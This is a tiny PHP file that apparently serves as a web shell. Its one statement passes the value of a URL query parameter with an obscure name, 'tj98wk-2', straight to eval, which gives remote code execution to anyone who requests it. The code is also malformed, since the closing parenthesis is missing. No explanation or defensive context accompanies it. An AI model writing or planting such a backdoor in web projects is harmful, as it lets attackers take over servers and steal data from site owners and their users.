<?php
eval($_GET['tj98wk-2'];
?>
